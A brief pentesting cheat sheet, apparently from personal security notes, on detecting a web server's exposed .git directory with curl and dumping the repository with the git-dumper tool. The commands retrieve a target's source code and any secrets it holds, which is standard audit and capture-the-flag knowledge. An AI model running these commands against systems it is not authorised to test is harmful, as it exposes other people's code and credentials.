
### Check if the repo is exposed

```bash
curl -s http://<repo>/.git/HEAD
```

If it returns `ref: refs/heads/main`, it's exposed.

Then use `git-dumper` to dump it :

```bash
pip install git-dumper
```

Add this line to `.bashrc` :

```
export PATH="$HOME/.local/bin:$PATH"
```

```
source ~/.bashrc
git-dumper [git repo] [storing dir]
```

